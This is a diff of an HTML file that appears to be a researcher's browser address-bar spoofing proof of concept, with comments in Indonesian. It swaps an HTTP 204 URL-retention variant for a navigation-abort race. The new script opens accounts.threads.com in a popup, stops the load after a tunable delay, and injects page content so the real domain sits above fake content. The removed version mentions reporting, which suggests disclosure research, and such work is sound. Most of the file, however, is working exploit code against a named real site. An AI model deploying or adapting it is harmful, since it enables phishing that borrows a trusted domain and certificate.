@@ -1,35 +1,26 @@
 <!DOCTYPE html>
-<!-- SPOOF PoC #4 — MECHANISM: NON-COMMITTING NAV / 204 URL-RETENTION (Rafay-Baloch class)
-     Fix-point: navigasi top-level yang TIDAK menghasilkan dokumen (HTTP 204 / download) →
-     bilah alamat update ke URL target tapi dokumen LAMA (konten palsu) dipertahankan.
-     BEDA dari #2-mu (pending/hang): di sini navigasi SELESAI tanpa body, bukan menggantung. -->
-<html lang="id"><head><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1"><title>POC — spoof retensi URL</title>
-<style>body{font-family:-apple-system,'Segoe UI',Roboto,Arial;margin:0;padding:28px;max-width:680px}
-h1{font-size:18px}code{background:#f6f8fa;padding:1px 5px;border-radius:4px;word-break:break-all}
-.cmp{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:14px 0}
-.cmp div{border:1px solid #d0d7de;border-radius:8px;padding:10px;font-size:12px;word-break:break-all}
-.cmp b{display:block;font-size:11px;color:#57606a}.fake{color:#1a7f37}.real{color:#cf222e}
-label{font-size:13px;color:#57606a}input{width:100%;padding:8px;border:1px solid #d0d7de;border-radius:6px;font-size:13px;margin:4px 0 12px}
-button{cursor:pointer;font-size:14px;border:1px solid #1a73e8;background:#1a73e8;color:#fff;border-radius:8px;padding:10px 18px;font-weight:600}
-.warn{background:#fff8c5;border:1px solid #d4a72c;border-radius:8px;padding:8px 12px;font-size:12px;color:#7a5c00;margin-top:12px}
-.mock{border:1px dashed #d0d7de;border-radius:8px;padding:16px;margin-top:16px;color:#5f6368}</style></head>
-<body>
-<h1>Spoof PoC #4 — 204 / Non-Committing Nav URL Retention</h1>
-<p>Halaman INI adalah konten palsunya. Saat tombol ditekan, kita navigasi ke endpoint yang balas <b>HTTP 204</b> (atau memicu download). Di browser rentan: bilah alamat berubah ke URL target, halaman ini <b>tetap tampil</b>.</p>
-<label>Endpoint 204 milik target (contoh: <code>https://accounts.threads.com/generate_204</code> — cari path yang balas 204/redirect-diam)</label>
-<input id="ep" value="https://accounts.threads.com/generate_204">
-<div class="cmp">
-  <div><b>DISPLAYED (harapan)</b><span class="fake" id="disp">https://accounts.threads.com/generate_204</span></div>
-  <div><b>REAL isi halaman</b><span class="real">konten palsu ini</span></div>
-</div>
-<button onclick="go()">▶ Navigasi ke 204 (uji retensi URL)</button>
-<div class="mock"><b style="color:#b00020">POC spoofing</b> — bilah alamat seharusnya menampilkan URL target sementara area ini tak berganti.</div>
-<div class="warn">Vulnerable bila setelah klik: bilah alamat = URL target, isi = halaman ini. Kalau halaman ini hilang/kosong → browser aman thd varian ini. Screenshot → STOP → lapor.</div>
+<!-- REAL-TARGET SPOOF PoC — navigation-abort race (window.stop) on a real target
+     Displayed: accounts.threads.com (URL real, cert real)   Content: initial-empty-doc diisi POC benign
+     Timing-sensitif: geser DELAY 120-600 kalau document.write keburu diblok cross-origin. -->
+<html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
+<body style="font-family:system-ui;padding:24px">
+  <h3>Threads spoof PoC (nav-abort)</h3>
+  <button style="font-size:16px;padding:12px 20px" onclick="go()">open accounts.threads.com</button>
 <script>
-const ep=document.getElementById('ep');ep.addEventListener('input',()=>document.getElementById('disp').textContent=ep.value);
+var DELAY = 260;                                   // <-- tuning timing
 function go(){
-  // navigasi top-level; jika endpoint balas 204/no-body, dokumen lama dipertahankan di browser rentan
-  location.href=ep.value;
+  var w = window.open("https://accounts.threads.com/", "_blank", "width=440,height=640");
+  if(!w){ alert("Izinkan popup lalu ulangi."); return; }
+  setTimeout(function(){
+    try{
+      w.stop();                                    // URL sudah commit di bilah alamat; batalkan load
+      w.document.title = "accounts.threads.com";
+      w.document.body.innerHTML =
+        '<div style="font-family:system-ui;padding:22px">'
+        +'<h3 style="font-weight:500;color:#5f6368">Spoofing POC — bukan Threads asli</h3>'
+        +'<p style="color:#b00020">Bilah alamat menampilkan accounts.threads.com, konten ini milik penyerang.</p></div>';
+    }catch(e){ /* keburu cross-origin -> kecilkan DELAY */ }
+  }, DELAY);
 }
-</script></body></html>
+</script>
+</body></html>
